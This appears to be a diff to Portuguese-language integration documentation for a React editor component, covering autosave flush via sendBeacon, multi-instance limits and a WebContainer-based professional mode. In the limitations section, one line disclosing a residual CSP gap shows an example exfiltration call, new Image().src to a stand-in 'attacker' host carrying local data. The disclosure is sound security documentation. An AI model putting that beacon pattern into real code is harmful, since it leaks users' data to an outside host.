@@ -52,7 +52,7 @@ import { createEmptyProject, type StudioHandle } from '@sistemazero/studio'
 <Studio
   initialProject={project}                  // uncontrolled; recarga externa = handle.replaceProject()
   persistence="none"                        // 'local' (IndexedDB, default) | 'none' | adapter custom
-  onChange={(p) => salvarNoBackend(p)}      // snapshot completo no debounce do autosave (1s) e em flushes
+  onChange={(p, ctx) => salvarNoBackend(p, ctx)} // snapshot no autosave (1s) e em flushes; ctx?.reason: 'autosave' | 'flush'
   onSave={(p) => salvarAgora(p)}            // pós "Salvar" explícito; Promise rejeitada marca erro no badge
   features={{ terminal: false, ai: { apiKey: chaveDoHost, model: 'anthropic/claude-sonnet-4.5' } }}
   allowedModes={['blocks', 'bridge']}       // esconde modos; modo salvo fora da lista cai no 1º permitido
@@ -64,6 +64,18 @@ import { createEmptyProject, type StudioHandle } from '@sistemazero/studio'
 ```
 
 Props ESTÁTICAS por instância (trocar exige remount): `persistence`, `limits`, `locale`.
+
+**Adapters remotos e flush no fechamento:** `onChange` recebe um 2º argumento OPCIONAL `ctx?: { reason: 'autosave' | 'flush' }`. No fechamento da aba (pagehide/beforeunload), no unmount e no "Salvar" explícito o Studio emite com `reason: 'flush'` — e um `fetch` normal é ABORTADO pela navegação, perdendo a última edição. Para um backend remoto, use um transporte com keepalive no flush:
+
+```tsx
+onChange={(p, ctx) =>
+  ctx?.reason === 'flush'
+    ? navigator.sendBeacon('/api/projects', JSON.stringify(p))   // sobrevive ao fechamento
+    : salvarNoBackend(p)                                          // autosave normal
+}
+```
+
+A biblioteca não chama `sendBeacon` sozinha (endpoint/credenciais são do host). Hosts `persistence="local"` não precisam disso (o IndexedDB já ordena as escritas).
 
 `<ProjectList onOpenProject={(id) => ...} />` — lista/gerência de projetos do IndexedDB local (por ora acoplada ao adapter local; hosts com backend devem listar pelos próprios dados).
 
@@ -84,6 +96,36 @@ CSP, se o host usa uma: o terminal precisa de `script-src 'unsafe-eval' 'wasm-un
 
 ## 6. Limitações conhecidas
 
-- Multi-instância funciona (stores por instância), MAS: o WebContainer é singleton por aba (2 terminais compartilham o container) e o atalho de teclado da busca de blocos fica com a última instância montada.
+- Multi-instância funciona (stores por instância), MAS: o WebContainer é singleton por aba e o atalho de teclado da busca de blocos fica com a última instância montada. Como o container é singleton, apenas UMA instância (não-profissional) pode usar o Terminal por aba — uma segunda mostra "Terminal já está em uso em outra instância nesta aba" em vez de sobrescrever os arquivos da primeira (namespacing por instância sob `/sz-<id>/` é item de backlog).
+- **Preview é de MESMA THREAD (modo não-profissional):** o iframe `srcdoc` null-origin compartilha a thread principal do host. O guarda de laços corta loops síncronos instrumentados, mas trabalho síncrono pesado que NÃO é laço (`Array.from({length: 1e10})`, `JSON.parse` gigante, ReDoS, recursão profunda) congela a thread e o watchdog só DETECTA — não interrompe. Remédio definitivo: servir o preview de outra origem (cross-origin/cross-process), hoje só no modo profissional.
+- **CSP do preview deixa um canal residual de exfil por GET de mão única:** por design `img/media/font/frame-src` liberam `https:` (com `connect-src 'none'`), então código de um projeto compartilhado/importado pode vazar dados locais do preview via `new Image().src = 'https://attacker/?'+dado`. A origem nula impede LER qualquer resposta. Hosts blindados podem, como backlog, optar por zerar esses subresources `https:`.
+- **Tema do Monaco é GLOBAL por página** (consequência do namespace único do Monaco — há um só tema ativo via `monaco.editor.setTheme`). Duas instâncias simultâneas em Código/Ponte (ex.: rota `/dual`) acabam adotando o ÚLTIMO tema definido; não há isolamento de tema por instância no Monaco. O Blockly, ao contrário, aplica tema por workspace. (Os models, esses sim, são isolados por instância: o `path` é salgado com um id estável por instância.)
 - Settings (tema via toggle, fonte do código, chave BYOK) são preferência do USUÁRIO, compartilhada entre instâncias e persistida em IndexedDB.
 - O smoke obrigatório na primeira integração Next/Turbopack: modo Código (autocomplete = workers do Monaco) e modo Ponte (digitar HTML → blocos = worker de reverse-parse). Se o worker `.ts` relativo falhar no bundler do host, ver plano B no CLAUDE.md (factory injetável).
+
+## 7. Modo Profissional (`features.professional`)
+
+O modo profissional troca o preview srcdoc por um **dev-server real (Vite) rodando dentro do WebContainer**: TypeScript + npm + Vite + React, com `npm install`/`npm run dev` de verdade e HMR. É a ponte do aluno dos blocos para uma stack moderna.
+
+```tsx
+import { createProProject } from '@sistemazero/studio'
+
+<Studio
+  initialProject={createProProject(crypto.randomUUID(), 'Meu app', 'react-ts')}
+  features={{ professional: true }}   // FORÇA terminal:true e allowedModes:['code']
+  persistence="local"
+/>
+```
+
+Templates disponíveis (`PRO_TEMPLATES` / `listProTemplates()`): `vanilla-vite`, `react-ts`, `three-ts`. A `<ProjectList professional />` mostra o seletor de template no "Novo projeto" e chama o factory por baixo.
+
+Regras NÃO-NEGOCIÁVEIS:
+
+- **COOP/COEP são OBRIGATÓRIOS** na rota inteira do editor (mesmos headers da seção 5 — `features.professional` já liga `terminal:true`). Sem eles o WebContainer não inicia.
+- **1 instância profissional por aba.** O WebContainer é singleton e o dev-server tem **uma** porta `server-ready` por vez; NÃO renderize dois `<Studio professional>` (nem a rota `/dual`) na mesma aba — eles disputam o mesmo container e a mesma porta.
+- **COEP afeta a página toda**: imagens/iframes cross-origin do host precisam de CORP/CORS, senão quebram. Ligue o modo só na rota do editor.
+- **O preview é cross-origin**: a URL vem do evento `server-ready` em runtime (porta dinâmica) — **não é configurável** pelo host. Exceções do app chegam ao Console via `preview-message`.
+- **Boot + `npm install` são lentos na 1ª carga** (segundos). Trocar de projeto preserva `node_modules` (mesmo template = sem reinstalar); a UI mostra os estados `Iniciando / Instalando / Subindo o servidor`.
+- **Persistência**: só o código-fonte é salvo (a árvore `tree`); `node_modules` **nunca** é persistido nem aceito no load (o sanitizer rebaixa para projeto básico qualquer árvore com `node_modules`).
+
+Um único sincronizador (`ProWebContainerProvider`) escreve no FS do container; o Terminal em modo profissional só abre o shell sobre o FS já montado (dois escritores corromperiam os arquivos).
